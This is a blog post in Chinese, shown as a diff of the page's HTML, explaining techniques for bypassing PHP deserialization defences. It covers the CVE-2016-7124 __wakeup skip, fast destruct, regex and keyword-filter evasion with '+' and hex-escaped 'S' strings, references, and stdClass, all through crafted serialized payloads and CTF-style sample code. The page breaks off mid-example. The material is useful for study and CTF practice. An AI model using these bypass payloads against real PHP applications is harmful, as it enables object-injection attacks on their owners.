@@ -1,0 +1,1402 @@
+<!DOCTYPE html><html lang="en">
+  <head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>php 反序列化绕过 - DumKiy's blog</title>
+
+<meta name="description" content="PHP 反序列化绕过__wakeup 绕过CVE-2016-7124在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性(变量)数大于实际的个数时， __wakeup() 不会被执行。例如如下的类，Name 类具有两个属性，分别是 username 和 passwordO:4:"Name"...">
+<link rel="canonical" href="http://localhost:4000/php/2023/06/08/php-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+
+<meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
+
+<meta name="theme-color" content="#ffffff">
+<!-- end favicons snippet --><link rel="stylesheet" href="/assets/css/main.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css" ><!-- start custom head snippets -->
+
+<!-- end custom head snippets -->
+<script>(function() {
+  window.isArray = function(val) {
+    return Object.prototype.toString.call(val) === '[object Array]';
+  };
+  window.isString = function(val) {
+    return typeof val === 'string';
+  };
+
+  window.hasEvent = function(event) {
+    return 'on'.concat(event) in window.document;
+  };
+
+  window.isOverallScroller = function(node) {
+    return node === document.documentElement || node === document.body || node === window;
+  };
+
+  window.isFormElement = function(node) {
+    var tagName = node.tagName;
+    return tagName === 'INPUT' || tagName === 'SELECT' || tagName === 'TEXTAREA';
+  };
+
+  window.pageLoad = (function () {
+    var loaded = false, cbs = [];
+    window.addEventListener('load', function () {
+      var i;
+      loaded = true;
+      if (cbs.length > 0) {
+        for (i = 0; i < cbs.length; i++) {
+          cbs[i]();
+        }
+      }
+    });
+    return {
+      then: function(cb) {
+        cb && (loaded ? cb() : (cbs.push(cb)));
+      }
+    };
+  })();
+})();
+(function() {
+  window.throttle = function(func, wait) {
+    var args, result, thisArg, timeoutId, lastCalled = 0;
+
+    function trailingCall() {
+      lastCalled = new Date;
+      timeoutId = null;
+      result = func.apply(thisArg, args);
+    }
+    return function() {
+      var now = new Date,
+        remaining = wait - (now - lastCalled);
+
+      args = arguments;
+      thisArg = this;
+
+      if (remaining <= 0) {
+        clearTimeout(timeoutId);
+        timeoutId = null;
+        lastCalled = now;
+        result = func.apply(thisArg, args);
+      } else if (!timeoutId) {
+        timeoutId = setTimeout(trailingCall, remaining);
+      }
+      return result;
+    };
+  };
+})();
+(function() {
+  var Set = (function() {
+    var add = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (data[i] === item) {
+          return;
+        }
+      }
+      this.size ++;
+      data.push(item);
+      return data;
+    };
+
+    var Set = function(data) {
+      this.size = 0;
+      this._data = [];
+      var i;
+      if (data.length > 0) {
+        for (i = 0; i < data.length; i++) {
+          add.call(this, data[i]);
+        }
+      }
+    };
+    Set.prototype.add = add;
+    Set.prototype.get = function(index) { return this._data[index]; };
+    Set.prototype.has = function(item) {
+      var i, data = this._data;
+      for (i = 0; i < data.length; i++) {
+        if (this.get(i) === item) {
+          return true;
+        }
+      }
+      return false;
+    };
+    Set.prototype.is = function(map) {
+      if (map._data.length !== this._data.length) { return false; }
+      var i, j, flag, tData = this._data, mData = map._data;
+      for (i = 0; i < tData.length; i++) {
+        for (flag = false, j = 0; j < mData.length; j++) {
+          if (tData[i] === mData[j]) {
+            flag = true;
+            break;
+          }
+        }
+        if (!flag) { return false; }
+      }
+      return true;
+    };
+    Set.prototype.values = function() {
+      return this._data;
+    };
+    return Set;
+  })();
+
+  window.Lazyload = (function(doc) {
+    var queue = {js: [], css: []}, sources = {js: {}, css: {}}, context = this;
+    var createNode = function(name, attrs) {
+      var node = doc.createElement(name), attr;
+      for (attr in attrs) {
+        if (attrs.hasOwnProperty(attr)) {
+          node.setAttribute(attr, attrs[attr]);
+        }
+      }
+      return node;
+    };
+    var end = function(type, url) {
+      var s, q, qi, cbs, i, j, cur, val, flag;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        s[url] = true;
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (cur.urls.has(url)) {
+            qi = cur, val = qi.urls.values();
+            qi && (cbs = qi.callbacks);
+            for (flag = true, j = 0; j < val.length; j++) {
+              cur = val[j];
+              if (!s[cur]) {
+                flag = false;
+              }
+            }
+            if (flag && cbs && cbs.length > 0) {
+              for (j = 0; j < cbs.length; j++) {
+                cbs[j].call(context);
+              }
+              qi.load = true;
+            }
+          }
+        }
+      }
+    };
+    var load = function(type, urls, callback) {
+      var s, q, qi, node, i, cur,
+        _urls = typeof urls === 'string' ? new Set([urls]) : new Set(urls), val, url;
+      if (type === 'js' || type ==='css') {
+        s = sources[type], q = queue[type];
+        for (i = 0; i < q.length; i++) {
+          cur = q[i];
+          if (_urls.is(cur.urls)) {
+            qi = cur;
+            break;
+          }
+        }
+        val = _urls.values();
+        if (qi) {
+          callback && (qi.load || qi.callbacks.push(callback));
+          callback && (qi.load && callback());
+        } else {
+          q.push({
+            urls: _urls,
+            callbacks: callback ? [callback] : [],
+            load: false
+          });
+          for (i = 0; i < val.length; i++) {
+            node = null, url = val[i];
+            if (s[url] === undefined) {
+              (type === 'js' ) && (node = createNode('script', { src: url }));
+              (type === 'css') && (node = createNode('link', { rel: 'stylesheet', href: url }));
+              if (node) {
+                node.onload = (function(type, url) {
+                  return function() {
+                    end(type, url);
+                  };
+                })(type, url);
+                (doc.head || doc.body).appendChild(node);
+                s[url] = false;
+              }
+            }
+          }
+        }
+      }
+    };
+    return {
+      js: function(url, callback) {
+        load('js', url, callback);
+      },
+      css: function(url, callback) {
+        load('css', url, callback);
+      }
+    };
+  })(this.document);
+})();
+</script><script>
+  (function() {
+    var TEXT_VARIABLES = {
+      version: '2.2.6',
+      sources: {
+        font_awesome: 'https://cdn.bootcdn.net/ajax/libs/font-awesome/5.15.1/css/all.css',
+        jquery: 'https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js',
+        leancloud_js_sdk: '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js',
+        chart: 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js',
+        gitalk: {
+          js: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.js',
+          css: 'https://cdn.bootcss.com/gitalk/1.2.2/gitalk.min.css'
+        },
+        valine: 'https://unpkg.com/valine/dist/Valine.min.js',
+        mathjax: 'https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML',
+        mermaid: 'https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js'
+      },
+      site: {
+        toc: {
+          selectors: 'h1,h2,h3,h4'
+        }
+      },
+      paths: {
+        search_js: '/assets/search.js'
+      }
+    };
+    window.TEXT_VARIABLES = TEXT_VARIABLES;
+  })();
+</script>
+</head>
+  <body>
+    <div class="root" data-is-touch="false">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
+
+      <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
+      <div class="header__title">
+        <div class="header__brand"><?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 20010904//EN"
+ "http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="512.000000pt" height="512.000000pt" viewBox="0 0 512.000000 512.000000"
+ preserveAspectRatio="xMidYMid meet">
+<metadata>
+Created by potrace 1.14, written by Peter Selinger 2001-2017
+</metadata>
+<g transform="translate(0.000000,512.000000) scale(0.100000,-0.100000)"
+fill="#000000" stroke="none">
+<path d="M825 4372 c-184 -12 -365 -129 -444 -287 -64 -129 -61 -53 -58 -1555
+l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
+1772 1 1837 20 183 52 330 209 373 395 13 58 15 235 13 1429 -2 995 -6 1370
+-14 1388 -7 14 -20 45 -30 70 -66 161 -226 287 -401 316 -36 6 -3441 12 -3528
+6z m3557 -236 c31 -13 70 -34 86 -47 42 -34 92 -113 107 -168 9 -35 11 -365
+10 -1376 -1 -1473 4 -1368 -66 -1459 -19 -24 -52 -56 -75 -70 -94 -60 34 -56
+-1883 -56 -1617 0 -1762 1 -1807 17 -27 9 -54 21 -61 27 -6 6 -27 22 -47 36
+-46 33 -92 112 -104 180 -15 77 -9 2674 5 2716 36 104 126 190 224 212 28 6
+684 10 1799 11 l1755 0 57 -23z"/>
+<path d="M1241 3509 c-27 -11 -47 -32 -61 -66 -22 -53 1 -81 409 -489 l395
+-394 -395 -394 c-289 -290 -397 -404 -406 -430 -31 -90 68 -165 154 -117 10 5
+215 207 455 448 291 291 439 447 443 466 4 15 4 39 0 55 -7 30 -860 893 -907
+918 -31 16 -53 17 -87 3z"/>
+<path d="M2551 1809 c-105 -14 -133 -147 -41 -194 44 -23 1336 -23 1380 0 71
+37 73 136 4 182 -23 15 -84 16 -662 17 -350 1 -657 -2 -681 -5z"/>
+</g>
+</svg>
+<a title="Watch And Learn
+" href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+      </nav></div>
+  </header>
+</div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
+
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
+
+              <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
+
+<!-- end custom main top snippet -->
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>php 反序列化绕过</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2023-06-07-php-反序列化绕过.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="php 反序列化绕过"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization">Deserialization</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Jun 08, 2023</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2023-06-08T06:06:04+08:00">
+    <meta itemprop="keywords" content="Deserialization"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
+
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="php-反序列化绕过">PHP 反序列化绕过</h1>
+
+<h2 id="__wakeup-绕过">__wakeup 绕过</h2>
+
+<h3 id="cve-2016-7124">CVE-2016-7124</h3>
+
+<p>在 PHP 5.6.25 之前版本和 7.0.10 之前的版本，当对象的属性(变量)数大于实际的个数时， <code class="language-plaintext highlighter-rouge">__wakeup()</code> 不会被执行。</p>
+
+<p>例如如下的类，Name 类具有两个属性，分别是 username 和 password</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"Name":2:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+</code></pre></div></div>
+<p>如果将属性的个数改为大于 2 的数就可以绕过 __wakeup()</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
+</code></pre></div></div>
+<h3 id="custom-object-绕过">custom object 绕过</h3>
+<p>PHP 5 中增加了接口（interface）功能。PHP 5 本身提供了一个 Serializable 接口，如果用户在自己定义的类中实现了这个接口，那么在该类的对象序列化时，就会被按照用户实现的方式去进行序列化，并且序列化后的标示不再是 O，而改为 C。C 标示的格式如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:&lt;name length&gt;:"&lt;class name&gt;":&lt;data length&gt;:{&lt;data&gt;}
+</code></pre></div></div>
+<p>custom object 并不支持__wakeup() 因此可以用于绕过 __wakeup</p>
+
+<h3 id="fast-destruct-绕过">Fast destruct 绕过</h3>
+
+<p>Fast destruct：在著名的 php 反序列工具 phpggc 中提及了这一概念。具体来说，在PHP中有：</p>
+<ol>
+  <li>如果单独执行 unserialize 函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</li>
+  <li>如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会
+变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。在这个题目中，反序列化得到的对象被赋给了 $res 导致 __destruct 在程序结尾才被执行，从而无法绕过 perg_match 代码块中的报错，如果能够进行 fast destruct,那么就可以提前触 __destruct，绕过反序列化报错。</li>
+</ol>
+
+<p>示例如下：</p>
+<ol>
+  <li>类 D 在 <code class="language-plaintext highlighter-rouge">__wakeup</code> 方法中将 flag 属性置为 False，当调用 <code class="language-plaintext highlighter-rouge">__get</code> 方法时如果 flag 属性为 True 则可以输出 flag</li>
+  <li>将 C 的 c 属性设置为一个 D 对象，则可以触发 D 的 <code class="language-plaintext highlighter-rouge">__get</code> 方法
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">D</span><span class="p">{</span>
+ <span class="k">public</span> <span class="nv">$flag</span><span class="o">=</span><span class="kc">True</span><span class="p">;</span>
+ <span class="k">public</span> <span class="k">function</span> <span class="n">__get</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+     <span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">flag</span><span class="p">){</span>
+         <span class="k">echo</span> <span class="s1">'flag'</span><span class="p">;</span>
+     <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+         <span class="k">echo</span> <span class="s1">'hint'</span><span class="p">;</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+ <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">(){</span>
+     <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="kc">False</span><span class="p">;</span>
+ <span class="p">}</span>
+<span class="p">}</span>
+<span class="kd">class</span> <span class="nc">C</span><span class="p">{</span>
+ <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+     <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">c</span><span class="o">-&gt;</span><span class="n">b</span><span class="p">;</span>
+ <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>    </div>
+    <p>正常情况下，可以先查看一下序列化大致的样子，如果直接反序列化这个 payload，自然是无法拿到 flag 的。</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">C</span><span class="p">();</span>
+<span class="nv">$a</span><span class="o">-&gt;</span><span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">D</span><span class="p">();</span>
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="c1">// O:1:"C":1:{s:1:"c";O:1:"D":1:{s:4:"flag";b:1;}}</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="s1">'O:1:"C":1:{s:1:"c";O:1:"D":1:{s:4:"flag";b:1;}}'</span><span class="p">);</span>
+<span class="c1">// 输出 hint</span>
+</code></pre></div>    </div>
+    <p>假如我们破坏这个序列化字符串的结构，例如删除调最后一个 }，php 会给出错误信息，但仍旧输出了 flag，php 在遇到报错后直接执行了 C 的 __destruct 方法，这样便绕过了 __wakeup。</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unserialize</span><span class="p">(</span><span class="s1">'O:1:"C":1:{s:1:"c";O:1:"D":1:{s:4:"flag";b:1;}'</span><span class="p">);</span>
+<span class="c1">// 输出 flag</span>
+</code></pre></div>    </div>
+    <p>直接将 D 类的属性修改为与定义的不符也可以绕过 __wakeup.</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unserialize</span><span class="p">(</span><span class="s1">'O:1:"C":1:{s:1:"c";O:1:"D":0:{};N;}'</span><span class="p">);</span>
+<span class="c1">// 输出 flag</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h2 id="php71--反序列化对类属性不敏感">php7.1 + 反序列化对类属性不敏感</h2>
+<p>如果变量前是 protected，序列化结果会在变量名前加上\x00*\x00</p>
+
+<p>但在特定版本 7.1 以上则对于类属性不敏感，比如下面的例子即使没有\x00*\x00也依然会输出abc</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">a</span> <span class="o">=</span> <span class="s1">'abc'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span>  <span class="n">__destruct</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">a</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="s1">'O:4:"test":1:{s:1:"a";s:3:"abc";}'</span><span class="p">);</span>
+</code></pre></div></div>
+<h2 id="正则匹配头是否为-o">正则匹配头是否为 O</h2>
+<p><code class="language-plaintext highlighter-rouge">preg_match('/^O:\d+/')</code>匹配序列化字符串是否是对象字符串开头, 这在曾经的 CTF 中也出过类似的考点</p>
+<ul>
+  <li>利用加号绕过（注意在 url 里传参时 + 要编码为 %2B）</li>
+  <li><code class="language-plaintext highlighter-rouge">serialize(array(a));</code>a 为要反序列化的对象 (序列化结果开头是 a，不影响作为数组元素的 <code class="language-plaintext highlighter-rouge">$a</code> 的析构)
+```php
+&lt;?php
+class test{
+  public $a;
+  public function __construct(){
+      $this-&gt;a = ‘abc’;
+  }
+  public function  __destruct(){
+      echo $this-&gt;a.PHP_EOL;
+  }
+}</li>
+</ul>
+
+<p>function match($data){
+    if (preg_match(‘/^O:\d+/’,$data)){
+        die(‘you lose!’);
+    }else{
+        return $data;
+    }
+}
+$a = ‘O:4:”test”:1:{s:1:”a”;s:3:”abc”;}’;
+// +号绕过
+$b = str_replace(‘O:4’,’O:+4’, $a);
+unserialize(match($b));
+// serialize(array($a));
+unserialize(‘a:1:{i:0;O:4:”test”:1:{s:1:”a”;s:3:”abc”;}}’);</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+## 利用引用
+```php
+&lt;?php
+class test{
+    public $a;
+    public $b;
+    public function __construct(){
+        $this-&gt;a = 'abc';
+        $this-&gt;b= &amp;$this-&gt;a;
+    }
+    public function  __destruct(){
+
+        if($this-&gt;a===$this-&gt;b){
+            echo 666;
+        }
+    }
+}
+$a = serialize(new test());
+</code></pre></div></div>
+<p>将<code class="language-plaintext highlighter-rouge">$b</code>设置为<code class="language-plaintext highlighter-rouge">$a</code>的引用，可以使<code class="language-plaintext highlighter-rouge">$a</code>永远与<code class="language-plaintext highlighter-rouge">$b</code>相等</p>
+
+<h2 id="unicode-绕过">unicode 绕过</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"test":2:{s:4:"%00*%00a";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
+</code></pre></div></div>
+<p>可以写成</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>O:4:"test":2:{S:4:"\00*\00\61";s:3:"abc";s:7:"%00test%00b";s:3:"def";}
+</code></pre></div></div>
+<p>表示字符类型的s大写时，会被当成16进制解析。</p>
+
+<p>示例如下：</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="kd">class</span> <span class="nc">test</span><span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s1">'admin'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span>  <span class="n">__destruct</span><span class="p">(){</span>
+        <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="n">check</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">'username'</span><span class="p">)</span><span class="o">!==</span><span class="kc">False</span><span class="p">){</span>
+        <span class="k">echo</span><span class="p">(</span><span class="s2">"你绕不过！！"</span><span class="mf">.</span><span class="kc">PHP_EOL</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span><span class="p">{</span>
+        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="c1">// 未作处理前</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'O:4:"test":1:{s:8:"username";s:5:"admin";}'</span><span class="p">;</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="c1">// 做处理后 \75是u的16进制</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s1">'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'</span><span class="p">;</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</code></pre></div></div>
+
+<h2 id="stdclass-绕过">stdClass 绕过</h2>
+
+<p>stdClass 是 PHP 中的一个内置类，用于创建一个通用的对象。stdClass 对象通常用于创建一个空对象，它没有预定义的属性或方法。这对于将数据存储在一个具有动态属性的结构中非常有用，因为你可以随时添加和删除属性。</p>
+
+<p>当题目没有给出一个现有的类时，可以考虑使用内置类 stdClass，stdClass 没有杂七杂八的方法和变量，在构造 exp 时可以避免一些其他内置类可能产生的错误。</p>
+
+<p>例题如下:</p>
+<ol>
+  <li>序类化字符串中不能有 flag 字符串。</li>
+  <li>反序列化之后的 flag 属性值如果为 flag，则将 flag 属性赋值为真正的 flag。</li>
+  <li>遍历所有属性，如果属性名不为 flag 则输出 flag。</li>
+</ol>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="k">include</span> <span class="s1">'flag.php'</span><span class="p">;</span>
+
+<span class="nv">$obj</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'obj'</span><span class="p">];</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/flag/i'</span><span class="p">,</span> <span class="nv">$obj</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"?"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nv">$obj</span> <span class="o">=</span> <span class="o">@</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">===</span> <span class="s1">'flag'</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$obj</span><span class="o">-&gt;</span><span class="n">flag</span> <span class="o">=</span> <span class="nv">$flag</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$obj</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$k</span> <span class="o">!==</span> <span class="s2">"flag"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$v</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这里涉及到多个知识点：</p>
+<ol>
+  <li>第一个是 preg_match 的绕过，可以使用 unicode 进行绕过。</li>
+  <li>php 在反序列化时不会严格限制序列化字符串中的属性个数是否与类的定义一致，举个例子：假设类中仅有两个属性 username 和 password。
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;?php</span>
+ <span class="kd">class</span> <span class="nc">Person</span><span class="p">{</span>
+     <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+     <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+
+     <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s2">"user"</span><span class="p">;</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">password</span> <span class="o">=</span> <span class="s2">"user"</span><span class="p">;</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+ <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Person</span><span class="p">();</span>
+ <span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">),</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+ <span class="c1">// O:6:"Person":2:{s:8:"username";s:4:"user";s:8:"password";s:4:"user";}</span>
+</code></pre></div>    </div>
+    <p>假设我们在反序列化时添加一个额外的属性 age：</p>
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="cp">&lt;?php</span>
+ <span class="kd">class</span> <span class="nc">Person</span><span class="p">{</span>
+     <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+     <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+
+     <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(){</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">username</span> <span class="o">=</span> <span class="s2">"user"</span><span class="p">;</span>
+         <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">password</span> <span class="o">=</span> <span class="s2">"user"</span><span class="p">;</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+ <span class="nv">$payload</span> <span class="o">=</span> <span class="s1">'O:6:"Person":3:{s:8:"username";s:4:"user";s:8:"password";s:4:"user";s:3:"age";s:2:"10";}'</span><span class="p">;</span>
+ <span class="nb">var_dump</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$payload</span><span class="p">));</span>
+ <span class="c1">// object(Person)#1 (3) {</span>
+ <span class="c1">//     ["username"]=&gt;</span>
+ <span class="c1">//     string(4) "user"</span>
+ <span class="c1">//     ["password"]=&gt;</span>
+ <span class="c1">//     string(4) "user"</span>
+ <span class="c1">//     ["age"]=&gt;</span>
+ <span class="c1">//     string(2) "10"</span>
+ <span class="c1">//   }</span>
+</code></pre></div>    </div>
+    <p>既然可以随意添加属性，我们就可以添加一个属性 a，配合引用的方法，将 a 设置为 flag 属性的引用。这样在遍历所有属性时，就可以打印出 flag 的值。</p>
+  </li>
+  <li>题目并没有给出一个现有的类，在反序列化一个不存在的类时，php 会将结果包裹在一个 __PHP_Incomplete_Class 类中。
+    <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nf">object</span><span class="p">(</span><span class="n">__PHP_Incomplete_Class</span><span class="p">)</span><span class="c1">#1 (3) {</span>
+     <span class="p">[</span><span class="s2">"__PHP_Incomplete_Class_Name"</span><span class="p">]</span><span class="o">=&gt;</span>
+     <span class="nf">string</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="s2">"whaterver"</span>
